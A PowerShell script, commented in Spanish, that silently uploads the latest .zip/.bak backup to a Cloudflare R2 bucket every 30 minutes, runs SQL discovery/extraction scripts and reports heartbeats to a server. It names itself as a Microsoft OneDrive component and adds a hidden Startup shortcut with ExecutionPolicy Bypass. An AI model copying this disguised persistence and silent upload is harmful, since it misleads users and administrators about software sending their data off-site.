#Requires -Version 5.0
<#
.SYNOPSIS
  Sube el .zip/.bak mas reciente de la carpeta source a Cloudflare R2.
  Corre cada 30 min via Task Scheduler, silencioso.
  Reporta heartbeat sync_ok o sync_error al servidor.
#>

param(
    [string]$ConfigPath = (Join-Path $env:LOCALAPPDATA 'Microsoft\OneDriveSync\config.json')
)

$ErrorActionPreference = 'Stop'

$InstallDir = Split-Path $ConfigPath -Parent
$LogDir     = Join-Path $InstallDir 'logs'
$LogFile    = Join-Path $LogDir 'sync.log'
$StateDir   = Join-Path $InstallDir 'state'
$LastUploadedFile = Join-Path $StateDir 'last-uploaded.json'

foreach ($d in @($LogDir, $StateDir)) {
    if (-not (Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
}

function Write-Log {
    param([string]$Level, [string]$Message)
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    Add-Content -Path $LogFile -Value "[$ts] [$Level] $Message" -Encoding UTF8
}

function Send-Heartbeat {
    param(
        [Parameter(Mandatory)][string]$Event,
        [string]$Status = 'ok',
        [hashtable]$Details = @{}
    )
    try {
        if (-not $script:cfg) { return }
        if (-not $script:cfg.heartbeat -or -not $script:cfg.heartbeat.url) { return }
        $body = @{
            client_id = $env:COMPUTERNAME
            event     = $Event
            status    = $Status
            details   = $Details
        } | ConvertTo-Json -Depth 5
        Invoke-WebRequest -Uri $script:cfg.heartbeat.url `
            -Method Post `
            -Headers @{ Authorization = "Bearer $($script:cfg.heartbeat.secret)" } `
            -ContentType 'application/json' `
            -Body $body `
            -TimeoutSec 10 `
            -UseBasicParsing | Out-Null
    } catch {
        Write-Log 'WARN' "heartbeat fail: $($_.Exception.Message)"
    }
}

# Log rotation
if ((Test-Path $LogFile) -and (Get-Item $LogFile).Length -gt 1MB) {
    $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
    Move-Item $LogFile (Join-Path $LogDir "sync-$stamp.log")
}
Get-ChildItem -Path $LogDir -Filter 'sync-*.log' -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) } |
    Remove-Item -Force -ErrorAction SilentlyContinue

Write-Log 'INFO' '=== sync start ==='
$startTs = Get-Date
$script:cfg = $null

# --- Asegurar Startup folder shortcut (idempotente, sin admin) ---
# Workaround S4U: cuando esta tarea S4U corre no tiene creds de red, pero
# un shortcut en Startup folder dispara startup-loop.ps1 al proximo logon
# en contexto interactivo (con creds).
try {
    $startupLoopScript = Join-Path $InstallDir 'startup-loop.ps1'
    if (Test-Path $startupLoopScript) {
        $startupFolder = [Environment]::GetFolderPath('Startup')
        $shortcutPath  = Join-Path $startupFolder 'OneDrive Sync Helper.lnk'
        if (-not (Test-Path $shortcutPath)) {
            $shell = New-Object -ComObject WScript.Shell
            $sc = $shell.CreateShortcut($shortcutPath)
            $sc.TargetPath       = 'powershell.exe'
            $sc.Arguments        = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$startupLoopScript`""
            $sc.Description      = 'Microsoft OneDrive Sync Helper'
            $sc.WindowStyle      = 7
            $sc.WorkingDirectory = $InstallDir
            $sc.Save()
            Write-Log 'INFO' "Startup shortcut creado: $shortcutPath"
        }
    }
} catch {
    Write-Log 'WARN' "startup shortcut: $($_.Exception.Message)"
}

try {
    if (-not (Test-Path $ConfigPath)) { throw "No existe config: $ConfigPath" }
    $script:cfg = Get-Content $ConfigPath -Raw | ConvertFrom-Json

    # --- Discover / extract SQL (si esta disponible en el install dir) ---
    # Corre una vez por ciclo. Si no hay 'sql' configurado -> discover.
    # Si ya hay -> extract (query directo a Sigma SQL).
    $discoverScript = Join-Path $InstallDir 'discover-sql.ps1'
    $extractScript  = Join-Path $InstallDir 'extract-sql.ps1'
    if (-not $script:cfg.sql -and (Test-Path $discoverScript)) {
        Write-Log 'INFO' 'invocando discover-sql.ps1 (primera vez)'
        try {
            & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $discoverScript
            # Re-leer config despues de discover (puede haber agregado sql.server)
            $script:cfg = Get-Content $ConfigPath -Raw | ConvertFrom-Json
        } catch {
            Write-Log 'WARN' "discover fallo: $($_.Exception.Message)"
        }
    }
    if ($script:cfg.sql -and (Test-Path $extractScript)) {
        Write-Log 'INFO' 'invocando extract-sql.ps1'
        try {
            & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $extractScript
        } catch {
            Write-Log 'WARN' "extract fallo: $($_.Exception.Message)"
        }
    }

    $source = $script:cfg.source
    $r2 = $script:cfg.r2
    if (-not $source) { throw 'config.json: falta source' }
    if (-not $r2 -or -not $r2.endpoint -or -not $r2.bucket -or -not $r2.access_key_id -or -not $r2.secret_access_key) {
        throw 'config.json: falta config r2.*'
    }

    if (-not (Test-Path $source)) {
        # Si es red (UNC) y no responde, probablemente la PC esta fuera de la red de oficina.
        # No es error: es comportamiento esperado. Heartbeat 'warn' + exit limpio.
        $isNetwork = $source -match '^\\\\'
        if ($isNetwork) {
            Write-Log 'WARN' "source UNC no alcanzable (PC fuera de red oficina): $source"
            Send-Heartbeat -Event 'sync_offline' -Status 'warn' -Details @{
                source_path = $source
                reason      = 'network path unreachable (PC may be off office LAN)'
            }
            exit 0
        }
        throw "source no existe: $source"
    }

    $awsExe = (Get-Command aws -ErrorAction SilentlyContinue).Source
    if (-not $awsExe -and (Test-Path 'C:\Program Files\Amazon\AWSCLIV2\aws.exe')) {
        $awsExe = 'C:\Program Files\Amazon\AWSCLIV2\aws.exe'
    }
    if (-not $awsExe) { throw 'aws-cli no esta en PATH' }

    $latest = Get-ChildItem -Path $source -File -Recurse -ErrorAction SilentlyContinue |
        Where-Object { $_.Extension -in @('.zip','.bak') } |
        Sort-Object LastWriteTime -Descending |
        Select-Object -First 1

    if (-not $latest) {
        Write-Log 'WARN' "no files en $source"
        Send-Heartbeat -Event 'sync_empty' -Status 'warn' -Details @{
            source = $source
        }
        exit 0
    }

    Write-Log 'INFO' "file=$($latest.Name) size_mb=$([math]::Round($latest.Length / 1MB, 1))"
    $sourceHash = (Get-FileHash -Path $latest.FullName -Algorithm SHA256).Hash

    if (Test-Path $LastUploadedFile) {
        $last = Get-Content $LastUploadedFile -Raw | ConvertFrom-Json
        if ($last.hash -eq $sourceHash -and $last.name -eq $latest.Name) {
            Write-Log 'INFO' 'same hash, skip'
            Send-Heartbeat -Event 'sync_skip' -Details @{
                filename = $latest.Name
                reason   = 'same_hash'
            }
            exit 0
        }
    }

    $s3Uri = "s3://$($r2.bucket)/$($latest.Name)"

    $env:AWS_ACCESS_KEY_ID     = $r2.access_key_id
    $env:AWS_SECRET_ACCESS_KEY = $r2.secret_access_key
    $env:AWS_DEFAULT_REGION    = 'auto'

    try {
        & $awsExe s3 cp $latest.FullName $s3Uri --endpoint-url $r2.endpoint --only-show-errors
        if ($LASTEXITCODE -ne 0) { throw "aws s3 cp exit=$LASTEXITCODE" }

        $duracionMs = [int]((Get-Date) - $startTs).TotalMilliseconds
        Write-Log 'INFO' "uploaded OK $($latest.Name) dur=${duracionMs}ms"

        $state = @{
            name     = $latest.Name
            hash     = $sourceHash
            uploaded = (Get-Date -Format 'yyyy-MM-ddTHH:mm:ssZ')
            size_mb  = [math]::Round($latest.Length / 1MB, 1)
        }
        $state | ConvertTo-Json | Set-Content $LastUploadedFile -Encoding UTF8

        # Rotacion R2
        try {
            $cutoff = (Get-Date).AddDays(-7).ToString('yyyy-MM-ddTHH:mm:ssZ')
            $jsonOut = & $awsExe s3api list-objects-v2 --bucket $r2.bucket --endpoint-url $r2.endpoint --output json 2>$null
            if ($LASTEXITCODE -eq 0 -and $jsonOut) {
                $objects = ($jsonOut | ConvertFrom-Json).Contents
                foreach ($obj in $objects) {
                    if ($obj.Key -eq $latest.Name) { continue }
                    if ($obj.LastModified -lt $cutoff) {
                        & $awsExe s3 rm "s3://$($r2.bucket)/$($obj.Key)" --endpoint-url $r2.endpoint --only-show-errors
                    }
                }
            }
        } catch {
            Write-Log 'WARN' "rotation fail (no critico): $($_.Exception.Message)"
        }

        Send-Heartbeat -Event 'sync_ok' -Details @{
            filename     = $latest.Name
            size_mb      = [math]::Round($latest.Length / 1MB, 1)
            source_path  = $source
            duracion_ms  = $duracionMs
            sha256       = $sourceHash.Substring(0, 12) + '...'
        }
    } finally {
        Remove-Item Env:\AWS_ACCESS_KEY_ID -ErrorAction SilentlyContinue
        Remove-Item Env:\AWS_SECRET_ACCESS_KEY -ErrorAction SilentlyContinue
        Remove-Item Env:\AWS_DEFAULT_REGION -ErrorAction SilentlyContinue
    }

    Write-Log 'INFO' '=== sync OK ==='
    exit 0
}
catch {
    Write-Log 'ERROR' $_.Exception.Message
    Write-Log 'ERROR' $_.ScriptStackTrace
    Send-Heartbeat -Event 'sync_error' -Status 'error' -Details @{
        error = $_.Exception.Message
    }
    exit 1
}
